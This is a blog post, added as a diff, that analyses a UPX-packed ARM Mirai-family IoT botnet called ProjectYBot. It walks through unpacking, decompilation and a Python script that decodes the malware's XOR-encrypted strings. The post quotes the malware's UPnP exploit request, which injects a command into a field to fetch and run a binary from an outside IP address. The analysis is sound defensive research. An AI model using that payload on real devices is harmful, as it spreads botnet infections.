@@ -1,0 +1,338 @@
+export const metadata = {
+  title: 'decrypting a upx packed arm iot botnet',
+  description: 'Reverse engineering analysis of ProjectYBot malware',
+  date: '2024-03',
+  authors: [{ name: 'Gustavo Figueiredo', url: 'https://figtracer.com' }],
+}
+
+# decrypting a upx packed arm iot botnet
+
+> This article contains technical analysis of malicious software. All malware samples discussed have been handled in a controlled, isolated laboratory environment using proper security protocols.
+
+I got a notification from MalwareBazaar that a new ELF binary was uploaded so I decided to take a look at it. Here's the sha256 hash if you want to check it out:
+
+```
+0aa7304453ec3340cb88c54191f6170b3a1ca1bbc175f1ea70484f114b16923b
+```
+
+It's a ELF 32-bit executable with no section header, which could mean that it's packed.
+
+```bash
+➜  Desktop file 0aa7304453ec3340cb88c54191f6170b3a1ca1bbc175f1ea70484f114b16923b.ELF
+0aa7304453ec3340cb88c54191f6170b3a1ca1bbc175f1ea70484f114b16923b.ELF: ELF 32-bit LSB executable, ARM, EABI4 version 1 (GNU/Linux), statically linked, no section header
+```
+
+That checks out when we run `strings`, the binary is packed with UPX (not the best way to figure that out, but it's usually enough)
+
+```bash
+➜  decrpyt_table strings 0aa7304453ec3340cb88c54191f6170b3a1ca1bbc175f1ea70484f114b16923b.elf
+(...)
+/$$J
+x)#[
+>Ca*aR
+UPX!
+UPX!  <--------------------------
+```
+
+Let's decrypt it:
+
+```bash
+➜  decrpyt_table upx -d 0aa7304453ec3340cb88c54191f6170b3a1ca1bbc175f1ea70484f114b16923b.elf
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2024
+UPX 4.2.4       Markus Oberhumer, Laszlo Molnar & John Reiser    May 9th 2024
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+[WARNING] bad b_info at 0xceac
+
+[WARNING] ... recovery at 0xceb0
+
+    215837 <-     71468   33.11%    linux/arm    0aa7304453ec3340cb88c54191f6170b3a1ca1bbc175f1ea70484f114b16923b.elf
+
+Unpacked 1 file.
+```
+
+The binary was 33% of its original size, disassembling it would return really cryptic assembly code. Fortunately, we saw it early enough :)  
+
+After unpacking the binary it's pretty easy to follow up its steps.
+
+> I'm going to use Binary Ninja to unravel the binary and we'll not be performing dynamic analysis in this article.
+
+After opening the binary in Binja, let's look at the Triage:
+
+From this view alone, we can see that:
+
+- it's indeed an ARM32 binary (platform: linux-armv7)
+- its entry point is at `0x8194` and its base address is `0x8000`
+- from the exports, we can guess that this malware is going to perform a couple of scans to search for devices from certain manufactures
+- will likely perform some kind of DoS attack
+
+Let's take a quick look at the `main()` function to see what's going on:
+
+- it has some anti-debugging techniques but that's not a concern since we'll not be doing dynamic analysis in this blog
+- `table_init()` seems interesting to me
+- `resolve_cnc_addr` could mean that it's getting the c2 server's ip, that's a good hint on what this is going to do
+- initializes more stuff.........
+
+There's a lot of info here but I decided to start analyzing `exploit_init()` since this is probably where the good stuff is at.
+
+```c
+uint32_t exploit_init(int32_t arg1, uint32_t arg2 @ r9, int32_t* arg3 @ r10, void* arg4 @ r11)
+
+{
+(...)
+
+uint32_t result = __GI_fork(arg1, r1, r2, 0);
+
+(...)
+conn_table = calloc(0x80, 0x1520);
+
+do
+{
+	uint32_t conn_table_4 = conn_table;
+	void* r2_3 = &i[(i * 0x2a)];
+	i = ((char*)i_4 + 1);
+	*(uint32_t*)(conn_table_4 + (&i_4[(i_4 * 0x2a)] << 5)) = 0xffffffff;
+	*(uint32_t*)(((r2_3 << 5) + conn_table_4) + 8) = 0;
+	i_4 = i;
+} while (i <= 127);
+	int32_t socket_fd;
+	int32_t r3_2;
+	socket_fd = __GI_socket(2, 3);
+
+(...)
+if (socket_fd != 0xffffffff)
+{
+	int32_t r0_7;
+	int32_t r3_3;
+	r0_7 = __GI___libc_fcntl(socket_fd, 3, 0, r3_2);
+	__GI___libc_fcntl(socket_fd, 4, (r0_7 | 0x800), r3_3);
+
+(...)
+{
+	int32_t r3_60 = r6_2[2];
+	if (r3_60 == 3)
+{
+	util_strcpy(&r6_2[0x47], "POST /UD/?9 HTTP/1.1\r\nUser-Age…");
+	int32_t r5_6 = *(uint32_t*)(r5_4 + conn_table_2);
+	util_strlen(&r6_2[0x47]);
+	__GI_send(r5_6, &r6_2[0x47]);
+
+(...)
+
+/*
+POST /UD/?9 HTTP/1.1\r\n
+User-Agent: r00ts3c-owned-you\r\n
+Content-Type: text/xml\r\n
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\n\r\n
+<?xml version="1.0" ?><s:Envelope
+xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>/tmp/.e && cd /tmp; >/var/dev/.e && cd /var/dev; wget http://5.59.248.92/adb; chmod 777 adb; sh adb; rm adb;`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
+*/
+```
+
+`exploit_init()` is a pretty lengthy function:
+
+- forks a process to perform scanning on different hosts located on a connection table (`conn_table`) that it initializes..
+- attempts to create a raw IPv4 socket for each host that can be used for direct network protocol access and packet manipulation (`socket(2,3)` where 2 = `AF_INET` and 3 = `SOCK_RAW`) and if it connects, tries setting the `O_NONBLOCK` flag so that read/write operations return immediately instead of waiting (`000083f0 __GI___libc_fcntl(socket_fd, 4, (r0_7 | 0x800), r3_3);`)
+- sends some data packets including a POST request to return a binary `abd` from `5.59.248.92` and run it with special privileges on `/tmp/.e` or `/var/dev/.e`
+
+Let's dive deeper....  
+
+I found this function `attack_init()` which mentions a couple of attacks for different networking protocols:
+
+- `attack-udp-plain`
+- `attack-udpe-vse`
+- `attack-tcp-stomp`
+- `attack-udp-ovhhex`  
+   (...)
+
+> TCP STOMP represents a significant evolution in TCP-based Denial of Service (DoS). This technique exploits fundamental aspects of TCP connection handling to overwhelm target systems.
+
+If we follow the traces of any of these attack functions, there's a function called `table_unlock_val()` that appears to be used to retrieve values from a table:
+
+(**!**) the `table_init` function that we found at the start could be useful here! let's check it out:
+
+- allocates some arbitrary memory bytes
+- copies unreadable garbage strings (we know that these are not garbage strings) into a memory location with `memcpy()`
+
+What's left to do is get these string values from the `table_init()` function and make our own python program that imitates `table_unlock_val()` to try and get the original ones.
+
+To write the script I needed the table key, which was pretty easy to find:
+
+```
+000341ec  uint32_t table_key = 0xdeaddaad
+```
+
+The final script:
+
+```python
+TABLE_KEY = 0xdeaddaad
+
+def decrypt_byte(byte, key):
+    return byte ^ (key & 0xFF) ^ ((key >> 8) & 0xFF) ^ ((key >> 16) & 0xFF) ^ ((key >> 24) & 0xFF)
+
+encrypted_data = {
+    0: "_Tvknagp]FkpY[Mjmpmepmjc[Iehseva[Omhh",
+    1: "Mjwpejga[ehvae`}[a|mw",
+    2: "gjg*clp}*kjhm",
+    3: "+`epe+hkgeh+p",
+    4: "QJWPEFHA>$etthap$jkp$bkq",
+    5: "+fmj+fqw}fk|$QJWPEF",
+    6: "+`ar+BPS@P545[sepgl`",
+    7: "Eggatp>$pa|p+lpih(etthmgepmkj+|lpih/|ih(etthmgepmkj+|ih?u94*=(mieca+saft(.+.?u94",
+    8: "Gkjpajp)P}ta>$etthmgepmkj+|)sss)bkvi)qvhajgk`",
+    9: "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+0*4?$B@I?$IWMAGveshav?$Ia`me$Gajpav$TG$1*",
+    10: "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+16*4*6307*552$Webevm+173*",
+}
+
+def table_unlock_val(index):
+    if index not in encrypted_data:
+        print(f"No data for index {index}")
+        return
+
+    encrypted_string = encrypted_data[index]
+
+    encrypted_bytes = encrypted_string.encode('ascii')
+
+    decrypted_bytes = bytes(decrypt_byte(b, TABLE_KEY) for b in encrypted_bytes)
+
+    print(f"Data for index {index}:")
+    print("Encrypted data:", encrypted_string)
+    print("Decrypted data (ASCII):", decrypted_bytes.decode('ascii', errors='replace'))
+
+if __name__ == "__main__":
+    for i in range(len(encrypted_data)):
+        table_unlock_val(i)
+        print()
+```
+
+(1)
+
+```python
+TABLE_KEY = 0xdeaddaad
+```
+
+Initializing the table key
+
+(2)
+
+```python
+def decrypt_byte(byte, key):
+    return byte ^ (key & 0xFF) ^ ((key >> 8) & 0xFF) ^ ((key >> 16) & 0xFF) ^ ((key >> 24) & 0xFF)
+```
+
+This function takes a single encrypted byte and our key, then:
+
+- splits our key into 4 parts (using & 0xFF to get each byte)
+- uses the xor operation (^) to "mix" each part with our encrypted byte
+- `>>` shifts our key right by 8, 16, and 24 bits to get each part
+
+(3)
+
+```python
+encrypted_data = {
+    0: "_Tvknagp]FkpY[Mjmpmepmjc[Iehseva[Omhh",
+    1: "Mjwpejga[ehvae`}[a|mw",
+    # (...)
+}
+```
+
+This is just a dictionary holding all our encrypted strings. each string is indexed by a number (0 through 10). these are the garbage strings we want to decrypt.
+
+(4)
+
+```python
+def table_unlock_val(index):
+    if index not in encrypted_data:
+        print(f"no data for index {index}")
+        return
+
+    encrypted_string = encrypted_data[index]
+
+    encrypted_bytes = encrypted_string.encode('ascii')
+
+    decrypted_bytes = bytes(decrypt_byte(b, TABLE_KEY) for b in encrypted_bytes)
+
+    print(f"data for index {index}:")
+    print("encrypted data:", encrypted_string)
+    print("decrypted data (ascii):", decrypted_bytes.decode('ascii', errors='replace'))
+```
+
+This is where the juice is, for each index:
+
+- we check if we actually have data for it
+- grab the encrypted string
+- turn it into bytes
+- decrypt each byte using our decrypt_byte function
+- convert it back to readable text and show both versions
+
+(5)
+
+```python
+if __name__ == "__main__":
+    for i in range(len(encrypted_data)):
+        table_unlock_val(i)
+        print()
+```
+
+Finally, this part just runs through all our encrypted strings (0 through 10) and decrypts each one...
+
+This is was the output:
+
+```
+Data for index 0:
+Encrypted data: _Tvknagp]FkpY[Mjmpmepmjc[Iehseva[Omhh
+Decrypted data (ASCII): [ProjectYBot]_Initiating_Malware_Kill
+
+Data for index 1:
+Encrypted data: Mjwpejga[ehvae`}[a|mw
+Decrypted data (ASCII): Instance_already_exis
+
+Data for index 2:
+Encrypted data: gjg*clp}*kjhm
+Decrypted data (ASCII): cnc.ghty.onli
+
+Data for index 3:
+Encrypted data: +`epe+hkgeh+p
+Decrypted data (ASCII): /data/local/t
+
+Data for index 4:
+Encrypted data: QJWPEFHA>$etthap$jkp$bkq
+Decrypted data (ASCII): UNSTABLE: applet not fou
+
+Data for index 5:
+Encrypted data: +fmj+fqw}fk|$QJWPEF
+Decrypted data (ASCII): /bin/busybox UNSTAB
+
+Data for index 6:
+Encrypted data: +`ar+BPS@P545[sepgl`
+Decrypted data (ASCII): /dev/FTWDT101_watchd
+
+Data for index 7:
+Encrypted data: Eggatp>$pa|p+lpih(etthmgepmkj+|lpih/|ih(etthmgepmkj+|ih?u94*=(mieca+saft(.+.?u94
+Decrypted data (ASCII): Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0
+
+Data for index 8:
+Encrypted data: Gkjpajp)P}ta>$etthmgepmkj+|)sss)bkvi)qvhajgk`
+Decrypted data (ASCII): Content-Type: application/x-www-form-urlencod
+
+Data for index 9:
+Encrypted data: Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+0*4?$B@I?$IWMAGveshav?$Ia`me$Gajpav$TG$1*
+Decrypted data (ASCII): Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.
+
+Data for index 10:
+Encrypted data: Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+16*4*6307*552$Webevm+173*
+Decrypted data (ASCII): Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.
+```
+
+As expected, these were real strings and we got even more information:
+
+- we can confirm that this is a Mirai family malware called ProjectYBot.
+- attempts to connect to C2: `cnc.ghty.onli`
+- uses various User-Agent strings for masking
+- checks for busybox (tells the malware if it's an embedded device which is the target here + has essential commands like `ls`, `cp`...)
+
+Mirai family malware is growing exponentially every year with the growth of ARM IoT devices.  
+
+The analysis reveals ProjectYBot as a sophisticated evolution of the Mirai malware family, highlighting the ongoing arms race in IoT security.
